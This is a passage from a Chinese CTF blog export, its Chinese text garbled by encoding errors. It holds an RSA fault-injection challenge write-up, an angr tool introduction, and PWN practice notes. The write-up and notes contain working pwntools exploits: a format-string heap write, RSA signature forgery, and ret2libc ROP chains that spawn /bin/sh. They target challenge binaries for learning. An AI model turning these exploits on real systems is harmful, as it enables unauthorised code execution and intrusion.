<span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( n9 &lt;= <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( n9 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printRSA</span>((__int64)v7);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( n9 == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">verifyAndRun</span>(v7);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( n9 != <span class="number">9</span> );</span><br><span class="line">  <span class="built_in">deleteRSA</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®æ—¶è®¡ç®—çš„å…¬é’¥N"><a href="#å®æ—¶è®¡ç®—çš„å…¬é’¥N" class="headerlink" title="å®æ—¶è®¡ç®—çš„å…¬é’¥N"></a>å®æ—¶è®¡ç®—çš„å…¬é’¥N</h4><p>æ˜æ˜¾çœ‹åˆ°<strong>n</strong>æ˜¯ä¸¤ä¸ª<strong>1024ä½</strong>çš„å¤§æ•°<strong>å®æ—¶</strong>ç›¸ä¹˜ï¼Œå³<strong>é€‰é¡¹ 1</strong> æ‰“å° <code>n=p*q</code> æ˜¯å®æ—¶è®¡ç®—çš„,å¯ä»¥ç”¨ä½œ<strong>éªŒè¯Fault Injectionæ˜¯å¦æˆåŠŸ</strong></p><blockquote><p><strong>$16*64=1024$</strong><br><img src="/2025/04/08/NPC_final_crypwnto/Pasted image 20250410154529.png" alt="Pasted image 20250410154529"></p></blockquote><h4 id="RSAå¯†ç ç®—æ³•ç”±GNUçš„GMPåº“å®ç°"><a href="#RSAå¯†ç ç®—æ³•ç”±GNUçš„GMPåº“å®ç°" class="headerlink" title="RSAå¯†ç ç®—æ³•ç”±GNUçš„GMPåº“å®ç°"></a>RSAå¯†ç ç®—æ³•ç”±GNUçš„GMPåº“å®ç°</h4><p>gmp åº“ä¸­ çš„$n,e,p,q$ä¸­è¿™ç±»å¤§æ•°å­—ä¼šå­˜åœ¨å †ä¸­ï¼Œåªè¦èƒ½æœ‰åœ¨<strong>å †ä¸Šä¿®æ”¹å†…å­˜</strong>çš„æ‰‹æ®µå°±å¯ä»¥æ”»å‡»æˆåŠŸ</p><h4 id="éšè—å‡½æ•°yada-å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#éšè—å‡½æ•°yada-å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="éšè—å‡½æ•°yada()å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>éšè—å‡½æ•°yada()å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h4><p>ä¸“é—¨ç»™äº†ä¸€ä¸ª<strong>å †æŒ‡é’ˆ</strong>ï¼Œè¿˜èƒ½éšä¾¿æ”¹å †æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®<br>ç»è¿‡gdbåŠ¨æ€è°ƒè¯•ï¼Œå¯ä»¥å¾—çŸ¥å †æŒ‡é’ˆåœ¨<strong>æ ˆ</strong>ä¸Šå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²påç§»ä¸º<strong>7</strong><br>å†ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å®ç°å †ä¸Šçš„ä»»æ„åœ°å€å†™ï¼ˆ<code>%7$n</code>ï¼‰<br>åªéœ€è¦çŸ¥é“RSAå‚æ•°çš„åœ¨å †ä¸­çš„æ­£ç¡®ä½ç½®å³å¯æ‰“å‡ºæ•…éšœæ³¨å…¥ï¼Œæ‹¿åˆ°ç§é’¥ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤</p><p><img src="/2025/04/08/NPC_final_crypwnto/Pasted image 20250410154831.png" alt="Pasted image 20250410154831"></p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><ol><li>é€‰é¡¹ 1 å…ˆè·å–ä¸€ä¸ª $n$</li><li>åˆ©ç”¨ <code>yada()</code> å°è¯• fault injectionï¼Œè¦çˆ†ç ´ rsa å‚æ•°çš„ä½ç½®</li><li>é€‰é¡¹ 1 æ£€æµ‹ $n$ å’ŒåŸæ¥ çš„ $n$ æ˜¯å¦ç›¸åŒï¼Œå¦‚æœä¸åŒåˆ™è¯´æ˜ inject æˆåŠŸ</li><li>è¿™ä¸ªæ—¶å€™ $p$ å’Œ  $q$å·²ç»æœ‰ä¸€ä¸ªè¢«ç©åäº†ã€‚é€‰é¡¹ 114 ç®—ä¸€ä¸ªé”™è¯¯ç­¾å $s$ï¼Œç„¶å <code>p = GCD(pow(s, e) - m, n)</code>ï¼Œç®—å‡ºç§é’¥</li><li>ä¼ªé€  signatureï¼Œéšä¾¿æ‰§è¡Œä½ æƒ³è¦çš„å‘½ä»¤</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><strong>å…ˆåœ¨æœ¬åœ°æ‰¾åˆ°æ­£ç¡®çš„ offset</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, GCD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_offset</span>(<span class="params">offset</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">num</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pubkey</span>():</span><br><span class="line">        choice(<span class="number">1</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;n = &quot;</span>)</span><br><span class="line">        n = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;e = &quot;</span>)</span><br><span class="line">        e = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">        <span class="keyword">return</span> n, e</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">injectFault</span>(<span class="params">offset</span>):</span><br><span class="line">        choice(<span class="number">9999</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(offset).encode())</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        r.sendline(<span class="string">b&quot;%7$n&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    r=process(<span class="string">&quot;./challenge&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Trying offset: <span class="subst">&#123;offset&#125;</span>&quot;</span>)</span><br><span class="line">    n,e=get_pubkey()</span><br><span class="line">    injectFault(offset)   </span><br><span class="line">    new_n,e=get_pubkey()</span><br><span class="line">    <span class="keyword">if</span> new_n != n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found offset: <span class="subst">&#123;offset&#125;</span>&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0</span></span><br><span class="line">step=<span class="number">1024</span>//<span class="number">8</span>-<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        try_offset(offset)</span><br><span class="line">        try_offset(-offset)</span><br><span class="line">        offset += step</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#Trying offset: -2413</span></span><br><span class="line"><span class="comment">#Found offset: -2413</span></span><br><span class="line"><span class="comment">#[*] Paused (press any to continue)</span></span><br></pre></td></tr></table></figure><p>æœ€åæ‰“ä¸€ä¸ªè¿œç¨‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, GCD</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&quot;./challenge&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;&quot;</span>, )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pubkey</span>():</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;n = &quot;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;e = &quot;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> n, e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">injectFault</span>(<span class="params">offset</span>):</span><br><span class="line">    choice(<span class="number">9999</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;%7$n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CallMortis</span>():</span><br><span class="line">    choice(<span class="number">114</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;sign = &quot;</span>)</span><br><span class="line">    sign = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Execute</span>(<span class="params">n,e,s,cmd</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    m = bytes_to_long(<span class="string">b&quot;ls -la /&quot;</span>)</span><br><span class="line">    p = GCD(<span class="built_in">pow</span>(s, e, n) - m, n)</span><br><span class="line">    q = n // p </span><br><span class="line">    <span class="keyword">assert</span>(p * q == n)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    sign = <span class="built_in">pow</span>(bytes_to_long(cmd), d, n)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,cmd)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(sign).encode())</span><br><span class="line"></span><br><span class="line">n,e=get_pubkey()</span><br><span class="line">success(<span class="string">b&quot;n=&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">success(<span class="string">b&quot;e=&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">injectFault(-<span class="number">2413</span>)</span><br><span class="line"></span><br><span class="line">s=CallMortis()</span><br><span class="line">success(<span class="string">b&quot;s=&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;cat /flag&quot;</span></span><br><span class="line">Execute(n,e,s,cmd)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è¿™é“é¢˜ä¸è®ºæ˜¯å¯†ç çš„éƒ¨åˆ†è¿˜æ˜¯äºŒè¿›åˆ¶çš„éƒ¨åˆ†ï¼Œæ‹†çœ‹å•ç‹¬çœ‹çš„è¯æœ€å¤šæ˜¯ä¸ª<strong>ç­¾åˆ°/ç®€å•éš¾åº¦</strong>ï¼Œä½†åˆåœ¨ä¸€å—å°±å¯èƒ½ä¼šå¾ˆéš¾äº†ï¼Œæ¯•ç«Ÿè·¨æ–¹å‘ã€‚</p><p>å‡ºé¢˜äººå…¶å®ä¹Ÿåœ¨è€ƒè™‘è¿™é¢˜æ˜¯æ”¾åœ¨Cryptoè¿˜æ˜¯Miscå¥½ï¼Œä½†æ˜¯PWNçš„éƒ¨åˆ†å®åœ¨æ˜¯å¤ªç­¾åˆ°äº†ï¼Œè¿˜æ˜¯æ”¾åœ¨Cryptoé‡Œé¢å§ï¼ŒåŸ¹å…»ä¸€ä¸‹é€‰æ‰‹ä»¬çš„ç»¼åˆèƒ½åŠ›ï¼Œåˆ«éª‚æˆ‘ğŸ˜­</p><p>æœ€åä¹Ÿæ˜¯è®©å¤§å®¶çˆ†é›¶äº†ï¼Œé¢˜ç›®è´¨é‡å¯ä»¥è¯´æ˜¯<strong>å¥½åäºŒè±¡æ€§</strong>ã€‚å¯èƒ½çœŸçš„éœ€è¦äºŒè¿›åˆ¶ã€å¯†ç åŒä¿®çš„åŒå­¦æ‰èƒ½å®Œæˆ</p><p>ä¸è¿‡ä¹Ÿå­¦åˆ°äº†ä¸€ç§å‡ºé¢˜æ€è·¯â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> å‡ºé¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·Angr</title>
      <link href="/2025/03/29/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Angr/"/>
      <url>/2025/03/29/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Angr/</url>
      
        <content type="html"><![CDATA[<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><h3 id="å®˜æ–¹"><a href="#å®˜æ–¹" class="headerlink" title="å®˜æ–¹"></a>å®˜æ–¹</h3><p><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=7546500">Angrå¼€å‘è€…å‘å¸ƒåœ¨IEEEä¸Šçš„è®ºæ–‡</a></p><p>angrå®˜æ–¹æ–‡æ¡£<a href="https://docs.angr.io/">README - angr Documentation</a></p><p>angrçš„APIæ–‡æ¡£<a href="https://api.angr.io/">angr API documentation â€” angr 9.2.26 documentation</a></p><h3 id="å®æˆ˜é¡¹ç›®"><a href="#å®æˆ˜é¡¹ç›®" class="headerlink" title="å®æˆ˜é¡¹ç›®"></a>å®æˆ˜é¡¹ç›®</h3><p>angr_ctfé¡¹ç›®<a href="https://github.com/jakespringer/angr_ctf">GitHub - jakespringer/angr_ctf</a></p><h3 id="å¸ˆå‚…ä»¬çš„åšå®¢"><a href="#å¸ˆå‚…ä»¬çš„åšå®¢" class="headerlink" title="å¸ˆå‚…ä»¬çš„åšå®¢"></a>å¸ˆå‚…ä»¬çš„åšå®¢</h3><p><a href="https://www.cnblogs.com/level5uiharu">https://www.cnblogs.com/level5uiharu</a></p><p><a href="https://www.cnblogs.com/0xJDchen/p/9291335.html">https://www.cnblogs.com/0xJDchen/p/9291335.html</a></p><p><a href="https://blog.csdn.net/qq_44370676/article/details/119714879">https://blog.csdn.net/qq_44370676/article/details/119714879</a></p><p><a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master">https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master</a></p><p><a href="https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/">https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/</a></p><p><a href="https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/">https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</a></p><p><a href="https://blog.csdn.net/weixin_49393427/article/details/119989356\">https://blog.csdn.net/weixin_49393427/article/details/119989356\</a></p><p><a href="https://github.com/a7vinx/angr-doc-zh_CN/blob/master/docs/overview.md">https://github.com/a7vinx/angr-doc-zh_CN/blob/master/docs/overview.md</a></p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><ul><li><p>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ <code>virtualenv AngrEnv</code></p></li><li><p>å¯åŠ¨è™šæ‹Ÿç¯å¢ƒ <code>source ./AngrEnv/bin/activate</code></p></li><li><p><code>pip install angr</code></p></li><li><p>é€€å‡ºç¯å¢ƒ<code>deactivate</code></p></li></ul><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>angr æ˜¯ä¸€ä¸ªæ”¯æŒå¤šå¤„ç†æ¶æ„çš„ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶åˆ†æçš„å·¥å…·åŒ…ï¼Œå®ƒæä¾›äº†åŠ¨æ€ç¬¦å·æ‰§è¡Œçš„èƒ½åŠ›ä»¥åŠå¤šç§é™æ€åˆ†æçš„èƒ½åŠ›ã€‚å®ƒå¯ä»¥è¢«ä½¿ç”¨è€…æ‰©å±•ï¼Œç”¨äºè‡ªåŠ¨åŒ–é€†å‘å·¥ç¨‹ã€æ¼æ´æŒ–æ˜ç­‰å¤šä¸ªæ–¹é¢</p><h3 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h3><p><img src="/2025/03/29/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Angr/1024198-20180710185031100-931587792.png" alt="1024198-20180710185031100-931587792"></p><h3 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h3><ul><li>åˆ©ç”¨ç¬¦å·æ‰§è¡Œæ¢ç©¶æ‰§è¡Œè·¯å¾„ï¼Œè‡ªåŠ¨è§£ctfé€†å‘é¢˜</li><li>åˆ©ç”¨angrè·å–ç¨‹åºæ§åˆ¶æµï¼ˆCFG)</li><li>åˆ©ç”¨angrç”Ÿæˆropé“¾</li><li>åˆ©ç”¨angrå‘ç°æ¼æ´</li><li>åˆ©ç”¨angråŠ å¯†ç¨‹åº</li><li>è¿›è¡Œæ±¡ç‚¹è·Ÿè¸ª</li></ul>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
            <tag> Angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåˆ·é¢˜ç¬”è®°ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</title>
      <link href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="GHCTF"><a href="#GHCTF" class="headerlink" title="GHCTF"></a>GHCTF</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h3><p>ç»•PIE<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line">backdoor = <span class="string">b&quot;\xC5&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + backdoor</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250314192604.png" alt="Pasted image 20250314192604"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;money\n&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flowers</span>(<span class="params">kind,num</span>):</span><br><span class="line">    manu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;20\n&#x27;</span>,<span class="built_in">str</span>(kind))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.peony $10</span></span><br><span class="line"><span class="string">    2.rose $100</span></span><br><span class="line"><span class="string">    3.fragrans $20</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;buy?\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hell_money</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_it</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hell_money(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">see_it(<span class="number">10000</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#0x0000000000400579 : ret</span></span><br><span class="line">ret=<span class="number">0x0000000000400579</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400d73</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x0000000000400B1E</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>  +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;it!!!\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;system--&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>  +p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130300.png" alt="Pasted image 20250313130300"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130240.png" alt="Pasted image 20250313130240"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132719.png" alt="Pasted image 20250313132719"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132731.png" alt="Pasted image 20250313132731"><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313135230.png" alt="Pasted image 20250313135230"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">rbp_ret = <span class="number">0x40117d</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">bss = <span class="number">0x4044e8</span></span><br><span class="line">printf=<span class="number">0x401227</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">5</span>) + <span class="string">b&#x27;%27$p&#x27;</span> + p64(bss+<span class="number">0x400</span>)+p64(printf)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;magic\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">5</span>))</span><br><span class="line">address=p.recvuntil(<span class="string">b&#x27;\xe8&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">address=<span class="built_in">int</span>(address,<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(address))</span><br><span class="line"></span><br><span class="line">libc_addr = address - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">128</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x2a3e5</span>+libc_addr</span><br><span class="line">binsh=libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rsi=<span class="number">0x2be51</span>+libc_addr</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+ p64(bss+<span class="number">0x500</span>) </span><br><span class="line">payload+= p64(rdi)+ 